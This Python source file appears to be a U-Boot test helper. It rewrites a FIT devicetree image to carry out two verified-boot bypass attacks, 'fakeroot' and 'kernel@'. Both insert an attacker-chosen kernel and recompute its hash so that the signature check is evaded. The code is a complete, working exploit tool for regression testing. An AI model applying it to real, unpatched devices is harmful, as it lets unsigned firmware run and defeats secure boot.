# SPDX-License-Identifier: GPL-2.0
# Copyright (c) 2020, Intel Corporation

# This modifies a devicetree to add a fake root node, for testing purposes

import hashlib
import struct
import sys

FDT_PROP = 0x3
FDT_BEGIN_NODE = 0x1
FDT_END_NODE = 0x2
FDT_END = 0x9

FAKE_ROOT_ATTACK = 0
KERNEL_AT = 1

MAGIC = 0xd00dfeed

EVIL_KERNEL_NAME = b'evil_kernel'
FAKE_ROOT_NAME = b'f@keroot'

def pad_buffer(buffer,n):
    while (len(buffer) % n != 0):
        buffer += b'\x00'

    return buffer

def getstr(strt, offset):

    output = ''

    while (strt[offset] != 0x00):
        output += chr(strt[offset])
        offset+=1

    return output


'''
Determines the offset of an element, either a node or a property, in the
FIT dt_struct.

Input:
    - searched_node_name: element path, ex: /images/kernel@1/data

Output:
    - tupple containing (node start offset, node end offset).

Error:
    if element is not found, returns (None, None)
'''
def determine_offset(dt, strt, searched_node_name):
    offset = 0
    depth = -1

    path = '/'

    object_start_offset = None
    object_end_offset = None
    object_depth = None

    while (offset < len(dt)):

        (tag,) = struct.unpack('>I', dt[offset:offset+4])

        if (tag == FDT_BEGIN_NODE):

            depth += 1

            begin_node_offset = offset

            offset +=4

            node_name = getstr(dt, offset)

            offset += len(node_name) + 1

            #align offset on 4 bytes
            if (offset % 4) != 0:
                offset += 4 - (offset % 4)

            after_begin_node_offset = offset

            if (path[-1] != '/'):
                path += '/'

            path += str(node_name)

            if path == searched_node_name:
                object_start_offset = begin_node_offset
                object_depth = depth

        elif tag == FDT_PROP:

            begin_prop_offset = offset

            offset += 4
            (len_tag,) = struct.unpack('>I', dt[offset:offset+4])

            offset += 4
            (nameoff,) = struct.unpack('>I', dt[offset:offset+4])

            offset += 4
            tag_data = dt[offset:offset+len_tag]

            prop_name = getstr(strt,nameoff)

            #align length on 4 bytes
            if (len_tag % 4) != 0:
                len_tag += 4 - (len_tag % 4)

            offset += len_tag

            node_path = path + '/' + str(prop_name)

            if node_path == searched_node_name:
                object_start_offset = begin_prop_offset

        elif tag == FDT_END_NODE:

            offset +=4

            path = path[:path.rfind('/')]

            if len(path) == 0:
                path += '/'

            if (depth == object_depth):
                object_end_offset = offset
                break

            depth -= 1

        elif tag == FDT_END:
            break

        else:
            print('unknown tag=0x%x, offset=0x%x found!' % (tag,offset))
            break


    return (object_start_offset, object_end_offset)



def modify_node_name(dt, node_offset, replcd_name):

    #skip 4 bytes for the FDT_BEGIN_NODE
    node_offset += 4

    node_name = getstr(dt, node_offset)
    node_name_len = len(node_name) + 1

    #align offset on 4 bytes
    if (node_name_len % 4) != 0:
        node_name_len += 4 - (node_name_len % 4)

    replcd_name += b'\x00'

    #align on 4 bytes
    while (len(replcd_name) % 4) != 0:
        replcd_name += b'\x00'

    dt = dt[:node_offset] + replcd_name + dt[node_offset+node_name_len:]

    return dt


def modify_prop_content(dt, node_offset, content):

    #skip FDT_PROP
    node_offset += 4
    (len_tag,) = struct.unpack('>I', dt[node_offset:node_offset+4])

    (nameoff,) = struct.unpack('>I', dt[node_offset+4:node_offset+8])

    # compute padded original node length
    original_node_len = len_tag + 8#content length + prop meta data len

    while (original_node_len % 4) != 0:
        original_node_len += 1

    added_data = struct.pack('>I', len(content))

    added_data += struct.pack('>I', nameoff)

    added_data += content

    while (len(added_data) % 4) != 0:
        added_data += b'\x00'

    dt = dt[:node_offset] + added_data + dt[node_offset+original_node_len:]

    return dt


'''
changes a given property its value

prop_path= full path of the target property
prop_value= new property name
required= raise an exception if property not found
'''
def change_property_value(dt_struct, dt_stings, prop_path, prop_value,
                          required=True):

    (rt_node_start, rt_node_end) = (determine_offset(dt_struct, dt_stings,prop_path))
    if rt_node_start == None:
        if not required:
            return dt_struct
        raise ValueError('Fatal error, unable to find prop %s' % prop_path)

    dt_struct = modify_prop_content(dt_struct,rt_node_start,prop_value)

    return dt_struct

'''
changes a given node name

node_path= full path of the target node
node_name= new node name, just node name not full path
'''
def change_node_name(dt_struct, dt_stings, node_path, node_name):

    (rt_node_start, rt_node_end) = (determine_offset(dt_struct, dt_stings,node_path))
    if (rt_node_start == None) or (rt_node_end == None):
        raise ValueError('Fatal error, unable to find root node')

    dt_struct = modify_node_name(dt_struct, rt_node_start, node_name)

    return dt_struct

#get the content of a property based on its path
def get_prop_value(dt_struct, dt_stings, prop_path):

    (offset, rt_node_end) = (determine_offset(dt_struct, dt_stings,prop_path))
    if (offset == None):
        raise ValueError('Fatal error, unable to find prop')

    offset += 4
    (len_tag,) = struct.unpack('>I', dt_struct[offset:offset+4])

    offset += 4
    (nameoff,) = struct.unpack('>I', dt_struct[offset:offset+4])

    offset += 4
    tag_data = dt_struct[offset:offset+len_tag]

    return tag_data


'''
This function conducts the kernel@ attack.

If fetches from /configurations/default the name of the kernel being loaded.
Then, if the kernel name does not contain any @sign, duplicates the kernel in
/images node and appends '@evil' to its name.
It inserts a new kernel content and updates its images digest.

Inputs:
    - FIT dt_struct
    - FIT dt_strings
    - kernel content blob
    - kernel hash blob

Important note: it assumes the U-Boot loading method is 'kernel' and the loaded
kernel hash's subnode name is 'hash-1'
'''
def kernel_at_attack(dt_struct, dt_stings, kernel_content, kernel_hash):

    #retrieve the default configuration name
    default_conf_name = get_prop_value(dt_struct, dt_stings, '/configurations/default')
    default_conf_name = str(default_conf_name[:-1], 'utf-8')

    conf_path = '/configurations/'+default_conf_name

    #fetch the loaded kernel name from the default configuration
    loaded_kernel = get_prop_value(dt_struct, dt_stings, conf_path + '/kernel')

    loaded_kernel = str(loaded_kernel[:-1], 'utf-8')

    print(loaded_kernel)

    if loaded_kernel.find('@') != -1:
        raise ValueError('kernel@ attack does not work on nodes already containing an @ sign!')

    #determine boundaries of the loaded kernel
    (krn_node_start, krn_node_end) = (determine_offset(dt_struct, dt_stings,'/images/'+ loaded_kernel))
    if (krn_node_start == None) or (krn_node_end == None):
        raise ValueError('Fatal error, unable to find root node')

    #copy the loaded kernel
    loaded_kernel_copy = dt_struct[krn_node_start:krn_node_end]

    #insert the copy inside the tree
    dt_struct = dt_struct[:krn_node_start] + loaded_kernel_copy + dt_struct[krn_node_start:]

    evil_kernel_name = loaded_kernel+'@evil'

    #change the inserted kernel name
    dt_struct = change_node_name(dt_struct, dt_stings, '/images/'+ loaded_kernel, bytes(evil_kernel_name, 'utf-8'))

    #change the content of the kernel being loaded
    dt_struct = change_property_value(dt_struct, dt_stings, '/images/'+ evil_kernel_name +'/data', kernel_content)

    #change the content of the kernel being loaded
    dt_struct = change_property_value(dt_struct, dt_stings, '/images/'+ evil_kernel_name +'/hash-1/value', kernel_hash)

    return dt_struct


'''
This function conducts the fakenode attack.

It duplicates the original root node at the beginning of the tree.
Then it modifies within this duplicated tree:
    - The loaded kernel name
    - The loaded  kernel data

Important note: it assumes the UBoot loading method is 'kernel' and the loaded kernel
hash's subnode name is hash@1

'''
def fake_root_node_attack(dt_struct, dt_stings, kernel_content, kernel_digest):

    #retrieve the default configuration name
    default_conf_name = get_prop_value(dt_struct, dt_stings, '/configurations/default')
    default_conf_name = str(default_conf_name[:-1], 'utf-8')

    conf_path = '/configurations/'+default_conf_name

    #fetch the loaded kernel name from the default configuration
    loaded_kernel = get_prop_value(dt_struct, dt_stings, conf_path + '/kernel')

    loaded_kernel = str(loaded_kernel[:-1], 'utf-8')

    #determine root node start and end:
    (rt_node_start, rt_node_end) = (determine_offset(dt_struct, dt_stings,'/'))
    if (rt_node_start == None) or (rt_node_end == None):
        raise ValueError('Fatal error, unable to find root node')

    #duplicate the whole tree
    duplicated_node = dt_struct[rt_node_start:rt_node_end]

    #dchange root name (empty name) to fake root name
    duplicated_node = change_node_name(duplicated_node, dt_stings, '/', FAKE_ROOT_NAME)

    dt_struct = duplicated_node + dt_struct

    #change the value of /<fake_root_name>/configs/<default_config_name>/kernel so our modified kernel will be loaded
    dt_struct = change_property_value(dt_struct, dt_stings, '/'+str(FAKE_ROOT_NAME,'utf-8')+conf_path+'/kernel', EVIL_KERNEL_NAME + b'\x00')

    #change the node of the /<fake_root_name>/images/<original_kernel_name>
    dt_struct = change_node_name(dt_struct, dt_stings, '/'+str(FAKE_ROOT_NAME,'utf-8')+'/images/'+loaded_kernel, EVIL_KERNEL_NAME)

    #change the content of the kernel being loaded
    dt_struct = change_property_value(dt_struct, dt_stings, '/'+str(FAKE_ROOT_NAME,'utf-8')+'/images/'+str(EVIL_KERNEL_NAME,'utf-8')+'/data', kernel_content, required=False)

    #update the digest value
    dt_struct = change_property_value(dt_struct, dt_stings, '/'+str(FAKE_ROOT_NAME,'utf-8')+'/images/'+str(EVIL_KERNEL_NAME,'utf-8')+'/hash-1/value', kernel_digest)

    return dt_struct

def add_evil_node(in_fname, out_fname, kernel_fname, attack):
    if attack == 'fakeroot':
        attack = FAKE_ROOT_ATTACK
    elif attack == 'kernel@':
        attack = KERNEL_AT
    else:
        raise ValueError('Unknown attack name!')

    with open(in_fname, 'rb') as f:
        input_data = f.read()

    hdr = input_data[0:0x28]

    offset = 0
    (magic,) = struct.unpack('>I', hdr[offset:offset+4])

    if (magic != MAGIC):
        raise ValueError('Wrong magic!')

    offset += 4
    (totalsize,) = struct.unpack('>I', hdr[offset:offset+4])
    offset += 4
    (off_dt_struct,) = struct.unpack('>I', hdr[offset:offset+4])
    offset += 4
    (off_dt_strings,) = struct.unpack('>I', hdr[offset:offset+4])
    offset += 4
    (off_mem_rsvmap,) = struct.unpack('>I', hdr[offset:offset+4])
    offset += 4
    (version,) = struct.unpack('>I', hdr[offset:offset+4])
    offset += 4
    (last_comp_version,) = struct.unpack('>I', hdr[offset:offset+4])
    offset += 4
    (boot_cpuid_phys,) = struct.unpack('>I', hdr[offset:offset+4])
    offset += 4
    (size_dt_strings,) = struct.unpack('>I', hdr[offset:offset+4])
    offset += 4
    (size_dt_struct,) = struct.unpack('>I', hdr[offset:offset+4])

    rsv_map = input_data[off_mem_rsvmap:off_dt_struct]
    dt_struct = input_data[off_dt_struct:off_dt_struct+size_dt_struct]
    dt_stings = input_data[off_dt_strings:off_dt_strings+size_dt_strings]

    with open(kernel_fname, 'rb') as kernel_file:
        kernel_content = kernel_file.read()

    #computing inserted kernel hash
    m = hashlib.sha1()
    m.update(kernel_content)
    hash_digest = m.digest()

    if attack == FAKE_ROOT_ATTACK:
        dt_struct = fake_root_node_attack(dt_struct, dt_stings, kernel_content,
                                          hash_digest)
    elif attack == KERNEL_AT:
        dt_struct = kernel_at_attack(dt_struct, dt_stings, kernel_content,
                                     hash_digest)

    #now rebuild the new file
    size_dt_strings = len(dt_stings)
    size_dt_struct = len(dt_struct)
    totalsize = 0x28 + len(rsv_map) + size_dt_struct + size_dt_strings
    off_mem_rsvmap = 0x28
    off_dt_struct = off_mem_rsvmap + len(rsv_map)
    off_dt_strings = off_dt_struct + len(dt_struct)

    header = struct.pack('>IIIIIIIIII', MAGIC, totalsize, off_dt_struct, off_dt_strings, off_mem_rsvmap, version, last_comp_version, boot_cpuid_phys, size_dt_strings, size_dt_struct)

    with open(out_fname, 'wb') as output_file:
        output_file.write(header)
        output_file.write(rsv_map)
        output_file.write(dt_struct)
        output_file.write(dt_stings)

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print('usage: %s <input_filename> <output_filename> <kernel_binary> <attack_name>' % sys.argv[0])
        print('valid attack names: [fakeroot, kernel@]')
        quit()

    add_evil_node(*sys.argv[1:])
